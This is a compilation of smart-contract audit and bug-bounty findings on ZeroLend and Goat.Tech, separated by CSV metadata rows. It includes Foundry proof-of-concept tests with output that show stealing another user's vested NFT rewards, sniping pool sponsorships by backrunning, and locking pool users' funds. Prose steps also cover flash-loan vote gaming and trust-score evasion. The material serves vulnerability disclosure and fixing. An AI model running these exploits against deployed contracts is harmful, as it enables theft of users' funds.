Wrong implementation in `VestedZeroNFT::split()` causes users' NFT to be stolen by anyone. Specifically, the problem arises from the `ERC721Upgradeable.sol::_requireOwned` check in `VestedZeroNFT::split()`  which fails to check the caller is the owner of the NFT, allow anyone to split the `pendingAmount` and `upfrontAmount` of any `tokenId` up to 99%.

## Vulnerability Details

In `VestedZeroNFT::split()`:
```
 function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
        _requireOwned(tokenId);

// REDACTED by erictee
```
the `_requireOwned` check is not implemented correctly. Let's take a look at `ERC721Upgradeable.sol::_requireOwned` in Openzeppelin:
```
 function _requireOwned(uint256 tokenId) internal view returns (address) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
        return owner;
    }
```
This function only return the address of the NFT owner but never revert if the caller is not the NFT owner. Therefore, anyone can call `VestedZeroNFT::split()` with any `tokenId` and to steal `pendingAmount` and `upfrontAmount` up to 99%.


## Impact Details

Direct theft of any user rewards.

## Recommendation

Consider making the following changes in `VestedZeroNFT::split()`:

```diff
 function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
--        _requireOwned(tokenId);
++       require(msg.sender == _requireOwned(tokenId), ""NFT Owner only!""); 
// REDACTED by erictee
```

## References
https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L234


## Proof of Concept

* Install foundry.
* Rename the original test folder to `hardhat-test` and create a new folder name `test`.
* Add forge-std module to lib with command: `git submodule add https://github.com/foundry-rs/forge-std lib/forge-std`
* add `remappings.txt` file in `contracts` folder with the following content:

```
@ethereum-waffle/=node_modules/@ethereum-waffle/
@layerzerolabs/=node_modules/@layerzerolabs/
@openzeppelin-3/=node_modules/@openzeppelin-3/
@openzeppelin/=node_modules/@openzeppelin/
@prb/=node_modules/@prb/
@sablier/=node_modules/@sablier/
@uniswap/=node_modules/@uniswap/
@zerolendxyz/=node_modules/@zerolendxyz/
base64-sol/=node_modules/base64-sol/
erc721a/=node_modules/erc721a/
eth-gas-reporter/=node_modules/eth-gas-reporter/
forge-std/=lib/forge-std/src/
hardhat-deploy/=node_modules/hardhat-deploy/
hardhat/=node_modules/hardhat/
ds-test/=lib/forge-std/lib/ds-test/src/
```

* Add `VestedZeroNFT.t.sol` file within test folder with the following content:

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from ""forge-std/Test.sol"";
import {VestedZeroNFT} from ""../contracts/vesting/VestedZeroNFT.sol"";
import {ZeroLend} from ""../contracts/ZeroLendToken.sol"";
import {StakingBonus} from ""../contracts/vesting/StakingBonus.sol"";
import {IVestedZeroNFT} from ""../contracts/interfaces/IVestedZeroNFT.sol"";
contract VestedZeroNFTTest is Test {
   
    address public admin;
    VestedZeroNFT public vesting;
    ZeroLend public zero;
    StakingBonus public stakingbonus;
    address public bob;
    address public exploiter;

    function setUp() public {
        vesting = new VestedZeroNFT();
        zero = new ZeroLend();
        stakingbonus = new StakingBonus(); //erictee: no need to init here as this is for testing.

        vesting.init(address(zero),address(stakingbonus));
        bob = makeAddr(""BOB"");
        exploiter = makeAddr(""EXPLOITER"");

        zero.togglePause(false);

    }

    
    function test_correct() external {
        console.log(address(vesting));
        console.log(address(vesting.zero()));
        console.log(zero.balanceOf(address(this)));
    }
    
    function test_StealAmountBySplitting() external {
        // preparation
        zero.approve(address(vesting), type(uint256).max);
        vesting.mint(
        bob, 
        15e18,   // 15 ZERO linear vesting
        5e18,  // 5 ZERO upfront
        1000,  // linear duration - 1000 seconds
        500,  // cliff duration - 500 seconds
        block.timestamp + 1000,  // unlock date
        false,   // penalty -> false
        IVestedZeroNFT.VestCategory.PRIVATE_SALE // 0
        );  // Same config as typescript testcase.

        vm.warp(block.timestamp + 1000); //fast forward to unlock date.

       (uint256 upfrontBefore, uint256 pendingBefore ) = vesting.claimable(1); // tokenId = 1
       console.log(""UPFRONT BOB Before: "", upfrontBefore);
       console.log(""PENDING BOB Before: "", pendingBefore);

       vm.startPrank(exploiter);
       vesting.split(1, 1); // tokenId = 1 , fraction =1 

    
       vm.stopPrank();

       (uint256 upfrontExploiter, uint256 pendingExploiter) = vesting.claimable(2); // exploiter owns the tokenId 2 
       console.log(""UPFRONT EXPLOITER: "", upfrontExploiter);
       console.log(""PENDING EXPLOITER: "", pendingExploiter);



       (uint256 upfrontAfter, uint256 pendingAfter ) = vesting.claimable(1); // tokenId = 1
       console.log(""UPFRONT BOB After: "", upfrontAfter);
       console.log(""PENDING BOB After: "", pendingAfter);


    }
}
```

* Finally, run the foundry test with :  `forge test --match-test test_StealAmountBySplitting -vv`

Foundry Result:
```
Running 1 test for test/VestedZeroNFT.t.sol:VestedZeroNFTTest
[PASS] test_StealAmountBySplitting() (gas: 656485)
Logs:
  UPFRONT BOB Before:  5000000000000000000
  PENDING BOB Before:  0
  UPFRONT EXPLOITER:  4999500000000000000
  PENDING EXPLOITER:  0
  UPFRONT BOB After:  500000000000000
  PENDING BOB After:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.15ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```",ZeroLend,EricTee,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29288%20-%20%5bSC%20-%20Critical%5d%20all%20NFTs%20can%20be%20stolen%20by%20calling%20VestedZeroNFT....md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:30:18,2024-10-15 01:30:42,1,,
1867084,82b0e0d0982d58a0b2dbadc9a379db71,zlrewardscontroller contract is incompatible with zerolend 's own reward bearing tokens,Cantina,2024-01-25,"Context: ZLRewardsController.sol#L510
Description: The ZLRewardsController contract is responsible for managing rewards. Owner can conﬁg-
ure this contract by adding reward bearing tokens, deciding allocation points for each token and deposit-
ing rewards. Users can earn rewards by holding these reward bearing tokens and claim their rewards.
The main logic of reward tracking is based on MasterChef contract. User's information of how much re-
ward per token is accumulated and the reward debt is tracked here. Based on this logic, every action
that changes user balance (e.g. transfer, mint or burn) should invoke a hook, and the user info should be
updated. This way users will always get fair share of total rewards based on their balances. This hook in
ZLRewardsController contract is _handleActionAfterForToken function, which is called in handleAction-
After function.
function handleActionAfter( //@audit Reward bearing tokens should call this function.
address _user,
uint256 _balance,
uint256 _totalSupply
) external {
if (!validRTokens[msg.sender] && msg.sender != address(streamedVesting))
revert NotRTokenOrMfd();
if (_user == address(streamedVesting)) return;
_handleActionAfterForToken(msg.sender, _user, _balance, _totalSupply);
}
This was introduction part about the logic. Now, let 's check why this contract is not incompatible with the
protocol itself.
As we can see at ZLRewardsController.sol#L17, ZLRewardsController contract is based on Radiant Capi-
tal's ChefIncentivesController.sol contract. You can see the handleActionAfter function in Radiant Capi-
tal's repo at ChefIncentivesController.sol#L611-L632.
Both Radiant Capital and ZeroLend 's core protocol contracts are forks from Aave. However, it seems like
Radiant Capital has changed their token implementations. They changed the regular handleAction hook
from Aave to handleActionAfter .
Check out Radiant Capital 's token implementation.
Radiant's token implementation _transfer function looks like this:
6
// skipped for brevity
if (address(_getIncentivesController()) != address(0)) {
uint256 currentTotalSupply = _totalSupply;
_getIncentivesController().handleActionAfter(sender, _balances[sender], currentTotalSupply);
if (sender != recipient) {
_getIncentivesController().handleActionAfter(recipient, _balances[recipient], currentTotalSupply);
}
}
Their reward bearing tokens call their incentives controller contract 's handleActionAfter hook after every
balance changing action, which is exactly how it should be.
Now, for Zerolend, let 's check the core contract 's token implementation.
Here you can also see the deployed versions in Zksync Era.
ZeroLend's token implementation is also forked from Aave but unlike Radiant Capital, the hook is un-
changed. The _transfer function of ZeroLend 's token implementation calls handleAction :
function _transfer(address sender, address recipient, uint128 amount) internal virtual {
// skipped for brevity
IAaveIncentivesController incentivesControllerLocal = _incentivesController;
if (address(incentivesControllerLocal) != address(0)) {
uint256 currentTotalSupply = _totalSupply;
incentivesControllerLocal.handleAction(sender, currentTotalSupply, oldSenderBalance);
if (sender != recipient) {
incentivesControllerLocal.handleAction(recipient, currentTotalSupply, oldRecipientBalance);
}
}
ZeroLend's reward bearing tokens will call handleAction function but the ZLRewardsController contract
does not have that function, it has handleActionAfter .
So basically, ZeroLend 's token implementation and Radiant Capital 's token implementations are different,
but the ZLRewardsController is directly implemented from Radiant Capital. The contract will not work with
the core protocol itself.
Note: All of these implementation contracts of Radiant Capital and ZeroLend can also be conﬁrmed with ether-
scan and zksync explorer.
Furthermore I provided only ""AToken"" implementations of ZeroLend in this submission with the assumption
of those tokens will be reward bearing tokens. But, I want to point out that other tokens in this protocol like
""ZeroToken"" or ""vestedToken"" etc. also do not invoke handleActionAfter at all.
Recommendation: I would recommend updating the hook in the ZLRewardsController contract.",ZeroLend,shaka|osmanozdemir1,HIGH,,,7,0,0,,https://cdn.cantina.xyz/reports/cantina_competition_zerolend_jan2024.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/cantina/cantina_competition_zerolend_jan2024.pdf,https://cantina.xyz/portfolio/6d383aaf-8554-4a06-a224-86189f81f531,solodit_reports,,2024-10-04 01:09:49,2024-10-15 01:10:56,1,,
1867193,eb40b18d61deba31d9bbded170710d45,"Attacker can take advantage of multiplier when there 's only one second left, allowing them to fraudulently gain voting power",Cantina,2024-04-08,"Context: (No context ﬁles were provided by the reviewer)
Description: In the main stake function, we have a require statement that checks whether our dura-
tion_ should be equal to zero or greater than or equal to _minDuration :
require(
duration_ == 0 || duration_ >= _minDuration,
""duration too small""
);
But we are not checking this in calMintStakingPower when we have some remaining duration left be-
cause we are only checking if rdis greater than zero. This consideration assumes lockTime_ is zero and
our lockAmount_ is greater than zero because we are staking lockAmount_ for rdtime for our attack:
function calMintStakingPower(
LLocker.SLock memory oldLockData,
uint lockAmount_,
uint lockTime_,
bool isSelfStake_,
uint selfStakeAdvantage_
) internal view returns (uint) {
uint rd = LLocker.restDuration(oldLockData);
uint oldALock = oldLockData.amount;
uint dLockForOldA = lockTime_;
uint dLockForStakeA = lockTime_ + rd;
if (lockTime_ == 0) {
require(rd > 0, ""already unlocked"");
}
uint rs = (oldALock *
calMultiplierForOldAmount(dLockForOldA) +
lockAmount_ *
calMultiplier(dLockForStakeA)) / LPercentage.DEMI;
if (isSelfStake_) {
rs = (rs * selfStakeAdvantage_) / LPercentage.DEMI;
}
return rs;
}
Now, attackers can take advantage of this to win the voting and earn Geth from whichever side they want.
Now, let 's see how someone can take advantage of this. Let 's say someone has staked _minStakeDCTA-
mount for one month . When the remaining duration is very small, they can take advantage of this. Basi-
cally, if we consider the remaining duration to be 1 second , then our multiplier will be 0.88 .
So, essentially, they can use any amount they want to lock for only 1 second and use the powerMinted to
vote on 'voteId '.
Now let 's take an example: An attacker has staked 7 Goat tokens for one month because it will be the
minimum required amount. There is a voting going on with voting ID . The attacker can take a loan of
a large amount of Goat tokens at the last second when the remaining duration is 1 second . They will
stake it to receive dP2PDToken tokens , then proceed to vote on some voteIDs . After that, they will call
lockWithdraw function with isForced function set to true, and then repay their loan with a fee. Because
they're withdrawing with isForced equal to true, they will need to bear a little loss since they will be
withdrawing 1 second early. However, if their earnings from votes can exceed the loss of the fee and
penalty for withdrawing 1 second early , an attacker can plan this type of attack on a large scale.
If the minStakeAmount is much less, it will be very easy for him to perform this attack.
Let's say the attacker has taken a loan of 100 Goat , and he 's staking for when the remaining duration is
1 second , then powerMinted is 88. After the attack, he can withdraw the same amount using the formula
below, considering FSis 10000 then the duration will be 1 month because we staked 7 Goat for 1 month
in starting.
Total will be 100 Goat, duration will be 1 month , and pastTime will be 1 month - 1 because the
rest duration is 1 second . Our receivedA in wei will be 99999961419753086419 with a loss of
13
38580246913581 wei. Now let 's say the fees were 0.01 , then the total loss will be 10000000000000000 +
38580246913581 = 10038580246913581 wei. The attacker can only perform the attack if he earns more
than 10038580246913581 wei.
function calDuration(
SLock memory lockData_,
uint fs_,
bool isPoolOwner_
) internal pure returns (uint) {
uint mFactor = isPoolOwner_ ? 2 * LPercentage.DEMI - fs_ : fs_;
uint duration = (lockData_.duration * mFactor) / LPercentage.DEMI;
return duration;
}
uint receivedA = (total * pastTime) / duration;
Recommendation: My recommendation is that we should check not only if rdis greater than zero, but
also if it is signiﬁcantly greater than 1 week or more, so that this type of attack will be very expensive and
infeasible due to the penalty.
function calMintStakingPower(
LLocker.SLock memory oldLockData,
uint lockAmount_,
uint lockTime_,
bool isSelfStake_,
uint selfStakeAdvantage_
) internal view returns (uint) {
uint rd = LLocker.restDuration(oldLockData);
uint oldALock = oldLockData.amount;
uint dLockForOldA = lockTime_;
uint dLockForStakeA = lockTime_ + rd;
if (lockTime_ == 0) {
require(rd > 1 weeks, ""already unlocked""); //-> Here
}
uint rs = (oldALock *
calMultiplierForOldAmount(dLockForOldA) +
lockAmount_ *
calMultiplier(dLockForStakeA)) / LPercentage.DEMI;
if (isSelfStake_) {
rs = (rs * selfStakeAdvantage_) / LPercentage.DEMI;
}
return rs;
}
Check out this reference.
Goat: ﬁxed. prolong with minStakeA
3.1.10 _updatesponsor implementation contradicts sponsor role in pool and open 's backrunning
attack vectors
Submitted by Spearmint, also found by ast3ros
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: The following is the deﬁnition of sponsor AKA trustor, and related info from the protocol
docs:
Your Trustor = the one who has the highest Staking Power in your pool. You can have only 1
Trustor.
In order to become one 's Sponsor, you need to stake the most ETH in his/her pool. Early
sponsors are protected for a short period of time .
The following is the _updateSponsor() in Controller.sol :
14
function _updateSponsor(
address payable poolOwner_,
address staker_,
uint minSPercent_
)
internal
{
if (poolOwner_ == staker_) {
return;
}
IProfile.SProfile memory profile = _profileC.profileOf(poolOwner_);
if (profile.sponsor == staker_) {
return;
}
require(profile.nextSPercent >= minSPercent_, ""profile rate changed"");
IPoolFactory.SPool memory pool = _poolFactory.getPool(poolOwner_);
IDToken p2UDtoken = IDToken(pool.dToken);
uint timeDiff = block.timestamp - profile.updatedAt;
if (timeDiff > _maxSponsorAfter) {
timeDiff = _maxSponsorAfter;
}
uint sponsorDTokenBalance = p2UDtoken.balanceOf(profile.sponsor);
uint stakerDTokenBalance = p2UDtoken.balanceOf(staker_);
uint sponsorBonus = sponsorDTokenBalance * (_maxSponsorAdv - 1)
* timeDiff / _maxSponsorAfter;
uint sponsorPower = sponsorDTokenBalance + sponsorBonus;
if (stakerDTokenBalance > sponsorPower || poolOwner_ == profile.sponsor) {
address[] memory pools = new address[](1);
pools[0] = poolOwner_;
earningPulls(poolOwner_, pools, poolOwner_);
_profileC.updateSponsor(poolOwner_, staker_);
}
}
•Issue 1: The current implementation of _updateSponsor() in Controller.sol does not protect early
sponsor 's.
If malicious eve backruns the Tx where Alice staked and became the sponsor of John 's Pool, by
staking just 100 wei more than Alice, Eve will become the sponsor because Alice will not be protected.
Check the proof of concept section for a full coded proof of concept of this scenario 1
•Issue 2: The current implementation of _updateSponsor() in Controller.sol contradicts a sponsor
deﬁntion as "" the staker with the highest staking power "", due to the incorrect formulae used.
One of many attack scenarios is : Alice stakes 10 ETH for 300 days in John 's pool, then later Eve
stakes 60 ETH for 300 days in John 's pool, Alice will still remain the sponsor of John 's pool even
though eve is contributing 6x more to the pool and has 6x her staking power. check PoC section for
a full coded Poc of this scenario.
Impact: Sponsor ""Snatching"" scenarios are possible. Core protocol deﬁnition of sponsor is violated.
The protocol will be overrun by bots that will be scanning all the pools and optimally staking and unstack-
ing just the right amount to gain and keep sponsorships, this is at the cost of regular users that will not
be able to respond as fast and as often as a bot.
Proof of concept:
•Issue 1: The current implementation of _updateSponsor() in Controller.sol does not protect early
sponsors.
If malicious eve backruns the Tx where Alice staked and became the sponsor of John 's Pool, by
staking just 100 wei wsteth more than Alice, Eve will become the sponsor because Alice will not be
protected.
The following foundry test test_FormulaeDoesNotProtectEarlySponsors() illustrates the above sce-
nario. Run it with the following command line input.
forge test --mt test_FormulaeDoesNotProtectEarlySponsors -vv
pragma solidity =0.8.8;
15
import ""forge-std/Test.sol"";
import ""forge-std/console.sol"";
import ""../contracts/Controller.sol"";
import ""../contracts/Profile.sol"";
import ""../contracts/lib/LLocker.sol"";
import ""../contracts/interfaces/IPoolFactory.sol"";
import ""../contracts/interfaces/IProfile.sol"";
import ""../contracts/interfaces/IDCT.sol"";
import ""../contracts/interfaces/IVoting.sol"";
import ""../contracts/interfaces/IEthSharing.sol"";
import ""../contracts/modules/UseAccessControl.sol"";
import ""../contracts/modules/Earning.sol"";
import ""../contracts/modules/Locker.sol"";
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
contract Fork is Test {
// GoatTech Contracts
Controller controller;
Profile profile;
Locker locker;
UseAccessControl useAccessControl;
// Setup users
address Whale = 0xD8Ea779b8FFC1096CA422D40588C4c0641709890;
address Alice = 0x71B61c2E250AFa05dFc36304D6c91501bE0965D8;
address Eve = 0xb2248390842d3C4aCF1D8A893954Afc0EAc586e5;
address John = 0x0F7F6B308B5111EB4a86D44Dc90394b53A3aCe13;
uint256 fork;
function setUp() public {
// Set up forked environment for Arbitrum Sepolia
fork = vm.createFork(""https://public.stackup.sh/api/v1/node/arbitrum-sepolia"");
// These addresses are the live GoatTech Contracts on Arbitrum Sepolia
controller = Controller(payable(address(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7)));
profile = Profile(0x7c25C3EDd4576B78b4F8aa1128320AE3d7204bEc);
locker = Locker(0x0265850FE8A0615260a1008e1C1Df01DB394E74a);
useAccessControl = UseAccessControl(0x588CF1494C5aC93796134E5e1827F58D2a8A9cDB);
}
function test_FormulaeDoesNotProtectEarlySponsors() public {
vm.selectFork(fork);
// John creates his pool and stakes 1 ETH for 720 days
vm.startPrank(John);
controller.ethStake{value: 1 ether}(payable(John), 720 days, 1000, 2000300, 1, 0);
// Alice stakes 0.01 ETH for 30 days
vm.startPrank(Alice);
controller.ethStake{value: 0.01 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);
// shows the new sponsor is Alice
IProfile.SProfile memory NewSProfile = profile.profileOf(John);
address NextSponsor1 = NewSProfile.sponsor;
assertTrue(NextSponsor1 == Alice);
// check and log the total amount of wsteth Alice has staked
LLocker.SLock memory AliceSlock = locker.getLockData(Alice, John);
uint AliceStakedWstethAmount = AliceSlock.amount;
console.log(""AliceStakedWstethAmount %e"", AliceStakedWstethAmount);
// Eve backruns Alice ' s Tx and deposits 1000000000000 wei more than Alice for 30 days
vm.startPrank(Eve);
controller.ethStake{value: 0.01 ether + 1000000000000 wei}(payable(John), 30 days, 1000,
2000300, 1, 0); ,→
// check and log the total amount of wsteth Eve has staked
LLocker.SLock memory EveSlock = locker.getLockData(Eve, John);
uint EveStakedWstethAmount = EveSlock.amount;
console.log(""EveStakedWstethAmount %e"", EveStakedWstethAmount);
16
// Log the tiny difference in staked Amounts
// If the protocol was live on Arbitrum One, An attacker can optimize this to be less than 1000
wei wsteth ,→
console.log(""DifferenceInStakedAmounts %e"", EveStakedWstethAmount - AliceStakedWstethAmount);
// shows the new sponsor is Eve
IProfile.SProfile memory NewerSProfile = profile.profileOf(John);
address NextSponsor2 = NewerSProfile.sponsor;
assertTrue(NextSponsor2 == Eve);
// IMPORTANT CAVEAT
// On Arbitrum One Eve would be able to directly Stake (AliceStakedWstethAmount + 1000), to
become the sponsor ,→
// Since I am limited by the testing environment I have provided a workaround test that gets
the point across but requires Eve to stake via depositing ETH ,→
// This causes the difference in wsteth amounts to be larger than it would be on Arbitrum One
// BUT, It is still a very tiny amount in this test ( 0.00000062 wsteth )
}
function test_SponsorDefintionViolated() public {
vm.selectFork(fork);
// John creates his pool and stakes 1 ETH for 720 days
vm.startPrank(John);
controller.ethStake{value: 1 ether}(payable(John), 720 days, 1000, 2000300, 1, 0);
// Alice stakes 10 ETH for 300 days
vm.startPrank(Alice);
controller.ethStake{value: 10 ether}(payable(John), 300 days, 1000, 2000300, 1, 0);
// Checks that Alice is the new Sponsor
IProfile.SProfile memory initialSProfile = profile.profileOf(John);
address InitialSponsor = initialSProfile.sponsor;
assertTrue(InitialSponsor == Alice);
// 7 days pass
skip(7 days);
// Eve stakes 60 ETH for 300 days
vm.startPrank(Eve);
controller.ethStake{value: 60 ether}(payable(John), 300 days, 1000, 2000300, 1, 0);
// Checks that ALice is still the sponsor, even though Eve is contributing 6x
IProfile.SProfile memory newSProfile = profile.profileOf(John);
address newSponsor = newSProfile.sponsor;
assertTrue(newSponsor == Alice);
console.log(""Sponsor after Eve staked 6x more than Alice: "", newSponsor);
}
}
–Console Output
forge test --mt test_FormulaeDoesNotProtectEarlySponsors -vv
[] Compiling...
[] Compiling 1 files with 0.8.8
[] Solc 0.8.8 finished in 2.21s
Compiler run successful!
Ran 1 test for test/PoCFormulaeDoesNotProtectEarlySponsors.t.sol:Fork
[PASS] test_FormulaeDoesNotProtectEarlySponsors() (gas: 14356680)
Logs:
AliceStakedWstethAmount 8.704844042654857e15
EveStakedWstethAmount 8.705460551990722e15
DifferenceInStakedAmounts 6.16509335865e11
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 207.18s (204.62s CPU time)
Ran 1 test suite in 207.18s (207.18s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total
tests) ,→
17
•Issue 2: The current implementation of _updateSponsor() in Controller.sol contradicts a sponsor
deﬁntion as "" the staker with the highest staking power "", due to the incorrect formulae used.
One of many attack scenarios is : Alice stakes 10 ETH for 300 days in John 's pool, then later Eve
stakes 60 ETH for 300 days in John 's pool, Alice will still remain the sponsor of John 's pool even
though eve is contributing 6x more to the pool and has 6x her staking power. check PoC section for
a full coded Poc of this scenario.
The foundry test test_SponsorDefintionViolated() illustrates the above scenario. Run it with the
following command line input
forge test --mt test_SponsorDefintionViolated -vv
–Console Output
forge test --mt test_SponsorDefintionViolated -vv
[] Compiling...
[] Compiling 3 files with 0.8.8
[] Solc 0.8.8 finished in 2.72s
Compiler run successful!
Ran 1 test for test/PoCFormulaeDoesNotProtectEarlySponsors.t.sol:Fork
[PASS] test_SponsorDefintionViolated() (gas: 14268993)
Logs:
Sponsor after Eve staked 6x more than Alice: 0x71B61c2E250AFa05dFc36304D6c91501bE0965D8
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 211.11s (208.38s CPU time)
Ran 1 test suite in 211.11s (211.11s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total
tests) ,→
Recommendation: Change the formulae when calculating sponsor advantage. Also do not provide a
sponsor advantage to users after x period of time to make they system more fair
Goat: ﬁxed. function ethStake( address payable poolOwner_, uint duration_, uint minSPercent_, uint
poolConﬁgCode_, uint minWstethA_, uint wstethA_, bool mustBeSponsor_ )
3.1.11 If pool owner withdraws 100% of earnings, poolusers will be permanently blocked from
withdrawing staked funds
Submitted by Spearmint
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Description: If pool owner withdraws 100% of earnings, poolUsers will be permanently blocked from
withdrawing staked funds, due to division by zero. The root cause is explained better in a sequence of
steps:
poolOwner withdrawing 100% of earnings causes earningBalance_ = 0 . 0 earningBalance_ will update Fs
= 0 by the following formulae:
function calFs(
uint earningBalance_,
uint maxEarning_
)
internal
pure
returns(uint)
{
uint max = maxEarning_;
if (max < earningBalance_) {
max = earningBalance_;
}
if (max == 0) {
return LPercentage.DEMI;
}
return earningBalance_ * LPercentage.DEMI / max;
}
18
When a user now tries to withdraw locked ETH, that transaction will invoke the _withdraw() function inside
Locker.sol , that will calculate the receivedA as follows:
uint receivedA = total * pastTime / duration;
Since Fs = 0, Duration will = 0 when being calculated by the following formulae:
function calDuration(
SLock memory lockData_,
uint fs_,
bool isPoolOwner_
)
internal
pure
returns(uint)
{
uint mFactor = isPoolOwner_ ? 2 * LPercentage.DEMI - fs_ : fs_;
uint duration = lockData_.duration * mFactor / LPercentage.DEMI;
return duration;
}
Since duration = 0 , going back to the _withdraw() function inside Locker.sol when calculating the re-
ceivedA it will divide by zero and result in the following error:
[FAIL. Reason: panic: division or modulo by zero (0x12)]
Impact: Pool Users will have permanently locked funds, thus high impact.
Likelihood: Any poolOwner can perform this by simply withdrawing all their earnings. This vulnerability
does not prevent poolOwners from withdrawing their staked funds, so they will have no ﬁnancial loss.
Proof of concept: The following foundry test illustrates a scenario where John withdraws his earnings
and locks Alice 's and Eve 's staked funds.Run it with the following command line input:
forge test --mt test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds -vv
// SPDX-License-Identifier: MIT
pragma solidity =0.8.8;
import ""forge-std/Test.sol"";
import ""forge-std/console.sol"";
import ""../contracts/Controller.sol"";
import ""../contracts/Profile.sol"";
import ""../contracts/DCT.sol"";
import ""../contracts/PoolFactory.sol"";
import ""../contracts/lib/LLocker.sol"";
import ""../contracts/interfaces/IPoolFactory.sol"";
import ""../contracts/interfaces/IProfile.sol"";
import ""../contracts/interfaces/IDCT.sol"";
import ""../contracts/interfaces/IVoting.sol"";
import ""../contracts/interfaces/IEthSharing.sol"";
import ""../contracts/modules/UseAccessControl.sol"";
import ""../contracts/modules/Earning.sol"";
import ""../contracts/modules/Locker.sol"";
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
import ""../contracts/modules/DToken.sol"";
contract Fork is Test {
// GoatTech Contracts
Controller controller;
Profile profile;
Locker locker;
UseAccessControl useAccessControl;
Earning earning;
// Setup users
address Whale = 0xD8Ea779b8FFC1096CA422D40588C4c0641709890;
19
address Alice = 0x71B61c2E250AFa05dFc36304D6c91501bE0965D8;
address Eve = 0xb2248390842d3C4aCF1D8A893954Afc0EAc586e5;
address John = 0x0F7F6B308B5111EB4a86D44Dc90394b53A3aCe13;
uint256 fork;
function setUp() public {
// Set up forked environment for Arbitrum Sepolia
fork = vm.createFork(""https://public.stackup.sh/api/v1/node/arbitrum-sepolia"");
// These addresses are the live GoatTech Contracts on Arbitrum Sepolia
controller = Controller(payable(address(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7)));
profile = Profile(0x7c25C3EDd4576B78b4F8aa1128320AE3d7204bEc);
locker = Locker(0x0265850FE8A0615260a1008e1C1Df01DB394E74a);
useAccessControl = UseAccessControl(0x588CF1494C5aC93796134E5e1827F58D2a8A9cDB);
earning = Earning(0xf7a08a0728C583075852Be8B67E47DceB5c71d48);
}
function test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds() public {
vm.selectFork(fork);
// John creates his own pool and stakes eth
vm.startPrank(John);
controller.ethStake{value: 10 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);
// check the total amount of wsteth John has staked in the pool
LLocker.SLock memory reeSlock = locker.getLockData(John, John);
uint JohnStakedWstethAmount = reeSlock.amount;
console.log(""JohnStakedWstethAmount"", JohnStakedWstethAmount);
// He gets other users to stake like Alice and Eve
vm.startPrank(Alice);
controller.ethStake{value: 100 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);
// check the total amount of wsteth Alice has staked in the pool
LLocker.SLock memory reeeSlock = locker.getLockData(Alice, John);
uint AliceStakedWstethAmount = reeeSlock.amount;
console.log(""AliceStakedWstethAmount"", AliceStakedWstethAmount);
vm.startPrank(Eve);
controller.ethStake{value: 100 ether}(payable(John), 30 days, 1000, 2000300, 1, 0);
// check john ' s earnings now
uint256 johnTotalEarnings = earning.earningOf(John);
console.log(""John ' s earnings after users stake in his pool"", johnTotalEarnings);
// 30 days pass
skip(30 days);
// John withdraws earnings
vm.startPrank(John);
controller.earningWithdraw(true, earning.earningOf(John), payable(John), 1);
// can ALice withdraw her locked funds?
// NO it will revert
vm.startPrank(Alice);
locker.approveAdmin(address(controller));
vm.expectRevert();
controller.lockWithdraw(true, payable(John), AliceStakedWstethAmount, payable(Alice), false, 1);
}
}
Console Output:
20
forge test --mt test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds -vv
[] Compiling...
[] Compiling 2 files with 0.8.8
[] Solc 0.8.8 finished in 3.21s
Compiler run successful!
Ran 1 test for test/PoCOwnerLocksUsers.t.sol:Fork
[PASS] test__IfPoolOwnerWithdrawsEarningsOthersCannotWithdrawLockedFunds() (gas: 14340319)
Logs:
JohnStakedWstethAmount 6671540705912181698
AliceStakedWstethAmount 65984438710531168379
John ' s earnings after users stake in his pool 5049570232408046637
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 207.91s (205.63s CPU time)
Ran 1 test suite in 207.91s (207.91s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Recommendation: If poolOwner 's Fs = 0, then allow poolUsers to directly withdraw funds without calcu-
lating duration.
Goat: Fixed
3.1.12 Malicious poolowner can withdraw earnings without affecting trust score
Submitted by Spearmint
Severity: High Risk
Context: (No context ﬁles were provided by the reviewer)
Relevant Context:
Fs = Financial Stability = ETH_Earning / Max_ETH_Earning
The core function of this protocol is to be a ""Reputation standard"", the following is extracted form the
docs FAQ section:
What is really your reputation/trustworthiness on Goat.Tech
It’s the ability to instil a belief in many people that you won 't withdraw the majority of your
earnings for a long time.
Normally if a user withdraws earnings their Fs will drop to = 0, this will cause their trust score to drop to
= 0.
Description: There is a way for a malicious user to withdraw their earnings without affecting their trust
score at all. It involves the following steps:
1. Use a second account to create a pool.
2. Conﬁgure the pool to have an Owner% of 99% .
3. When you want to withdraw earnings from the main account use the reinvestEarnings function to
stake the earnings into the second account 's pool.
4. Now since the pool has a 99% owner percentage, the second account 's owner will receive 99% of
the staked amount as earnings (dev team gets 1%).
5. Now withdraw the earnings from second account to main account 's wallet.
6. This will not compromise the trust score at all, even though the pool owner has withdrawn all their
earnings. See the proof of concept.
Impact: The issue breaks the core function of the protocol being a ""reputation standard"" and I have
shown a simple way how a user can effectively withdraw their earnings without affecting the trust score.
The ""Trust Score"" cannot be trusted if it can be manipulated like this by bad actors.
